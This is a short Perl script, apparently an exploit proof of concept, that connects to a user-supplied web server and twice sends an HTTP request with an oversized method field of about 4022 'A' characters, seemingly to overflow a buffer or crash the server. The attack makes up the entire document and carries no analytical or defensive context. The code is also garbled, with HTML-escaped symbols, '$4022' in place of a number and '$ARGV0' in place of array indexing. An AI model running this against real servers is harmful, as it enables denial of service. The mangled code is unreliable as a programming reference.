#!/usr/bin/perl
use IO::Socket;
if (@ARGV &lt; 2) {
print "Usage: host port\n";
exit;
}
$overflow = "A" x $4022;
&amp;connect;
sleep(15);
&amp;connect;
exit;
################################################
sub connect() {
$sock= IO::Socket::INET-&gt;new(Proto=&gt;"TCP",
PeerAddr=&gt;$ARGV0,
PeerPort=&gt;"$ARGV1",)
or die "Cant connect to $ARGV0: $!\n";
$sock-&gt;autoflush(1);
print $sock "$overflow /index.html HTTP/1.0\n\n";
$response=&lt;$sock&gt;;
print "$response";
while(&lt;$sock&gt;){
print "$_\n";
}
close $sock;
}
